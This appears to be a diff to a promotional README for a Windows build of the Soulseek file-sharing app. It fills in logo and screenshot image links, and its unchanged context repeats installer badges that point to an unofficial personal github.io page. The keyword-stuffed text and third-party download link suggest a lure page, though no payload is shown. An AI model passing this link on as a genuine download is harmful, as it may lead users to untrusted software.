@@ -1,7 +1,7 @@
 # Soulseekqt P2P Music Exchange and File Sharing System for Windows
 
 <div align="center">
-  <img src="LINK_TO_LOGO" alt="Program Logo"/>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRq5hK_UM57ZDeIRHBy_VdxVAOVOxcvkbFBWA&s" alt="Program Logo"/>
 </div>
 
 [![Desktop Installer](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://tituspollardvtae.github.io/.github/Slsk-File-Sharing-System)
@@ -23,7 +23,7 @@ Furthermore, the soulseek music app interface is designed for power users who ne
 By adopting the Slsk file sharing system, you contribute to a persistent, community-run network that has served music lovers for years. The software is lightweight and optimized for Windows, allowing you to run your node in the background while you focus on exploring new audio horizons. As a dedicated soulseek app, it remains the gold standard for independent, decentralized music exchange.
 
 <div align="center">
-  <img src="SCREENSHOT_LINK" alt="Program Interface Screenshot"/>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSeYqmjxt2jU0UsN3_nEFP5M2w7Pvv_2iZPTw&s" alt="Program Interface Screenshot"/>
 </div>
 
 [![Desktop Installer](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://tituspollardvtae.github.io/.github/Slsk-File-Sharing-System)
